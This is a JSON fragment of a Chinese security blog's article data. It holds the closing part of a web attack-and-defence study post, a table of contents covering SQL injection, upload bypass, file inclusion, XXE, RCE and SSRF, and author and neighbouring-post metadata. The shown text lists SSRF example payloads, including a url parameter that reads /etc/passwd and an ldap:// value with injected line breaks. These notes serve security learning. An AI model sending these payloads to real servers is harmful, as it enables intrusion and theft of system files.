13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，xxxxxx.com&#x2F;index.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议, url&#x3D;ldap:&#x2F;&#x2F;localhost:1337&#x2F;%0astats%0aqui<br>tftp:&#x2F;&#x2F; 简单文件传输协议<br>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用<strong>gopherus</strong>生成payload</p></blockquote>\n","text":"WEB攻防-通用漏洞大型靶场Vulhub - Docker-Compose file for vulnerability environment SQL注入-补...","permalink":"/post/WEB攻防-通用漏洞","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">WEB攻防-通用漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5-%E8%A1%A5%E5%85%85%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">SQL注入-补充内容</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ACCESS%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">ACCESS注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">偏移注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">使用场景</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">注入原理</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#MYSQL\"><span class=\"toc-text\">MYSQL</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sqlmap\"><span class=\"toc-text\">sqlmap</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sqlmap%E8%81%94%E5%8A%A8msf\"><span class=\"toc-text\">sqlmap联动msf</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">脚本使用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E4%BA%8E%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87select%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">(基于堆叠注入)绕过select过滤</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">二次注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">过程</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%A1%88%E4%BE%8B\"><span class=\"toc-text\">案例</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DNS%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">DNS注入</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">文件上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%BB%91%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">黑白盒测试</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%BB%91%E7%9B%92\"><span class=\"toc-text\">黑盒</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%99%BD%E7%9B%92\"><span class=\"toc-text\">白盒</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">解析执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#user-ini\"><span class=\"toc-text\">.user.ini</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#htaccess\"><span class=\"toc-text\">.htaccess</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-1\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6\"><span class=\"toc-text\">条件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%A4%BA%E4%BE%8B\"><span class=\"toc-text\">示例</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">过滤绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">绕过&lt;?php?&gt;过滤</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BC%95%E5%8F%B7-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">利用反引号&#96;&#96;绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97\"><span class=\"toc-text\">包含日志</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9F%AD%E7%BD%91%E5%9D%80%E7%BB%95%E8%BF%87%E2%80%9D-%E2%80%9D\"><span class=\"toc-text\">短网址绕过”.”</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">文件头检测</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%AF%E5%9C%A8%E6%96%87%E4%BB%B6%E5%A4%B4%E9%83%A8%E6%B7%BB%E5%8A%A0%E8%AF%A5%E7%89%B9%E5%BE%81%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B-%E4%BE%8B%E5%A6%82-user-ini-GIF89Aauto-prepend-file-test-png\"><span class=\"toc-text\">可在文件头部添加该特征绕过检测, 例如&#96;&#96;&#96;user ini:GIF89Aauto_prepend_file&#x3D;test.png</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89\"><span class=\"toc-text\">条件竞争</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">漏洞原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">利用</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93\"><span class=\"toc-text\">二次渲染</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">二次渲染原理</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%AF%86%E5%88%AB\"><span class=\"toc-text\">识别</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">中间件解析漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#IIS-5-x-6-x\"><span class=\"toc-text\">IIS 5.x-6.x</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#IIS7-5\"><span class=\"toc-text\">IIS7.5</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#apache\"><span class=\"toc-text\">apache</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">换行解析</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">多后缀解析</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Nginx\"><span class=\"toc-text\">Nginx</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">文件名逻辑漏洞</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">解析漏洞</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">编辑器漏洞</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">文件包含</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E8%A6%81%E7%82%B9\"><span class=\"toc-text\">思路要点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%BB%91%E7%9B%92-1\"><span class=\"toc-text\">黑盒</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%99%BD%E7%9B%92-1\"><span class=\"toc-text\">白盒</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#php%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">php伪协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#file-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">file 协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6-1\"><span class=\"toc-text\">条件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%A4%BA%E4%BE%8B-1\"><span class=\"toc-text\">示例</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#php-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">php 协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#php-filter%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3\"><span class=\"toc-text\">php:&#x2F;&#x2F;filter参数详解</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#data-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">data 协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6-2\"><span class=\"toc-text\">条件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%A4%BA%E4%BE%8B-2\"><span class=\"toc-text\">示例</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#http-https-%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">http &amp; https 协议</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9D%A1%E4%BB%B6-3\"><span class=\"toc-text\">条件</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BD%9C%E7%94%A8\"><span class=\"toc-text\">作用</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%A4%BA%E4%BE%8B-3\"><span class=\"toc-text\">示例</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#LFI-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB\"><span class=\"toc-text\">LFI 本地文件包含</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#XXE-%E2%80%93-XML-External-Entity-Injection\"><span class=\"toc-text\">XXE – XML External Entity Injection</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XML\"><span class=\"toc-text\">XML</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%A6%82%E5%BF%B5\"><span class=\"toc-text\">概念</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#DTD\"><span class=\"toc-text\">DTD</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5-XXE\"><span class=\"toc-text\">XML外部实体注入(XXE)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">漏洞发现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%BB%91%E7%9B%92-2\"><span class=\"toc-text\">黑盒</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%99%BD%E7%9B%92-2\"><span class=\"toc-text\">白盒</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">任意文件读取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%9C%89%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">有回显</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">无回显</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">利用场景</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%98%B2%E5%BE%A1\"><span class=\"toc-text\">防御</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#RCE-%E2%80%93-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">RCE – 远程代码执行漏洞</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86-2\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%BB%95%E8%BF%87-1\"><span class=\"toc-text\">绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">通配符绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8\"><span class=\"toc-text\">参数逃逸</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8C%85%E5%90%AB-%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">包含&amp;伪协议</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%8A%B1%E6%8B%AC%E5%8F%B7\"><span class=\"toc-text\">花括号{}</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%9C%E6%9D%A0\"><span class=\"toc-text\">斜杠</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4\"><span class=\"toc-text\">空格过滤</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6\"><span class=\"toc-text\">一些命令分隔符</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">黑名单绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">拼接绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">编码绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">单引号和双引号绕过</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8Shell-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">利用Shell 特殊变量绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#linux%E4%B8%AD%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9\"><span class=\"toc-text\">linux中查看文件内容</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSRF-%E2%80%93-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">SSRF – 服务器端请求伪造</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSRF%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98\"><span class=\"toc-text\">SSRF漏洞挖掘</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">漏洞产生场景</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%A7%E7%94%9FSSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">产生SSRF漏洞的函数</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#file-get-contents\"><span class=\"toc-text\">file_get_contents</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#fsockopen\"><span class=\"toc-text\">fsockopen()</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#curl-exec\"><span class=\"toc-text\">curl_exec()</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SSRF%E4%B8%ADURL%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">SSRF中URL的伪协议</span></a></li></ol></li></ol></li></ol>","author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"加入择栖工作室谢谢喵~      学习机器学习谢谢喵~","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"WEB攻防-反序列化","uid":"ac4ec20c26cff8515ee8496cfa9ab5e9","slug":"WEB攻防-反序列化","date":"2024-03-18T13:45:44.000Z","updated":"2024-04-21T10:30:45.807Z","comments":true,"path":"api/articles/WEB攻防-反序列化.json","keywords":null,"cover":[],"text":"反序列化什么是反序列化格式转换 序列化: 对象转换为数组或字符串等格式 反序列化: 将数组或字符串等格式转换成对象 PHP反序列化漏洞产生原因魔法方法 触发：u...","permalink":"/post/WEB攻防-反序列化","photos":[],"count_time":{"symbolsCount":"2k","symbolsTime":"2 mins."},"categories":[],"tags":[],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"加入择栖工作室谢谢喵~      学习机器学习谢谢喵~","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"(转)知识点合集","uid":"7877f5fab13c4afbf71848ed5da71412","slug":"转-知识点合集","date":"2024-03-05T15:07:07.000Z","updated":"2024-03-11T03:21:52.691Z","comments":true,"path":"api/articles/转-知识点合集.json","keywords":null,"cover":[],"text":" Author: Evi1cg Blog: https://evi1cg.github.io 信息搜集开源情报信息收集（OSINT）github Github_...","permalink":"/post/转-知识点合集","photos":[],"count_time":{"symbolsCount":"39k","symbolsTime":"35 mins."},"categories":[],"tags":[],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"加入择栖工作室谢谢喵~      学习机器学习谢谢喵~","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}